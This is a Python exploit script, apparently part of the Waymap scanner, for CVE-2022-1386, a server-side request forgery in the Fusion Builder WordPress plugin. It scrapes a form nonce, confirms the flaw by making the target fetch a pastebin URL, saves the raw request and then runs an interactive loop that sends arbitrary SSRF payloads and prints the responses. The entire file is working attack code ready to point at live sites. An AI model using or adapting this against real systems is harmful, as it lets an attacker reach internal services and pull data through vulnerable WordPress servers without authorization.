# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-1386

import binascii
import json
import os
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def encode_multipart_form_data(fields):
    boundary = binascii.hexlify(os.urandom(16)).decode('ascii')

    body = (
            "".join("--%s\r\n"
                    "Content-Disposition: form-data; name=\"%s\"\r\n"
                    "\r\n"
                    "%s\r\n" % (boundary, field, value)
                    for field, value in fields.items()) +
            "--%s--\r\n" % boundary
    )

    content_type = "multipart/form-data; boundary=%s" % boundary

    return body, content_type


def make_folder(domain):
    os.makedirs("output", exist_ok=True)
    os.makedirs(f"output/{domain}", exist_ok=True)


def save_fusion_id(domain, fusion_id):
    with open(f"output/{domain}/fusion_id.txt", "w") as f:
        f.write(fusion_id)


def load_fusion_id(domain):
    if os.path.exists(f"output/{domain}/fusion_id.txt"):
        with open(f"output/{domain}/fusion_id.txt", "r") as f:
            return f.read()
    else:
        return None


def generate_fusion_id(url, domain):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers"
    }
    data = {
        "action": "fusion_form_update_view"
    }
    fusion_id = load_fusion_id(domain)
    if fusion_id is None:
        r = requests.post(url + "/wp-admin/admin-ajax.php", headers=headers, data=data, verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            try:
                fusion_id = soup.find("input", {"name": "fusion-form-nonce-0"})["value"]
                save_fusion_id(domain, fusion_id)
                return fusion_id
            except TypeError:
                return None
        else:
            return None
    else:
        return fusion_id


def exploit(url, domain, payload, request):
    fusion_id = generate_fusion_id(url, domain)

    if fusion_id is None:
        return False

    data = {
        "formData": f"email=example%40example.com&fusion_privacy_store_ip_ua=false"
                    f"&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
                    f"&fusion-form-nonce-0={fusion_id}&fusion-fields-hold-private-data=",
        "action": "fusion_form_submit_form_to_url",
        "fusion_form_nonce": fusion_id,
        "form_id": "0",
        "post_id": "0",
        "field_labels": '{"email":"Email address"}',
        "hidden_field_names": "[]",
        "fusionAction": payload,
        "fusionActionMethod": "GET"
    }
    encoded_data = encode_multipart_form_data(data)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Content-Type": encoded_data[1]
    }

    r = requests.post(url + "/wp-admin/admin-ajax.php", headers=headers, data=encoded_data[0], verify=False)
    request['request'] = r.request  
    if r.status_code == 200:
        try:
            return r.json()
        except json.decoder.JSONDecodeError:
            return {"status": "failed"}
    else:
        return {"status": "failed"}


def save_raw_request(request, filename):
    headers = [f"{k}: {v}" for k, v in request.headers.items()]
    with open(filename, "w") as f:
        f.write(request.method + " " + request.url + " HTTP/1.1\r\n")
        f.write("\r\n".join(headers))
        f.write("\r\n\r\n")
        f.write(request.body)


def run_exploit(target):
    url = target
    domain = url.split("//")[1].split("/")[0]
    make_folder(domain)

    request = {}
    test_url = "https://pastebin.com/raw/XNBxNyaU"
    print("[+] Testing SSRF...")
    result = exploit(url, domain, test_url, request)
    
    if "3e87da640674ddd9c7bafbc1932b91c9" in result['info']:
        print("[+] Target is vulnerable to SSRF!")
        print("[+] Saving raw request...")
        save_raw_request(request['request'], f"output/{domain}/raw_request.txt")
        print(f"[+] Raw request saved to output/ folder")

        while True:
            payload = input("[>] Payload: ")
            if payload == "exit":
                break
            print("[+] Sending payload...")
            result = exploit(url, domain, payload, request)
            if result['status'] == 'success':
                print("[+] Response:")
                print(result['info'])
            else:
                print("[-] Payload is not working!")
    else:
        print("[-] Target is not vulnerable to SSRF!")
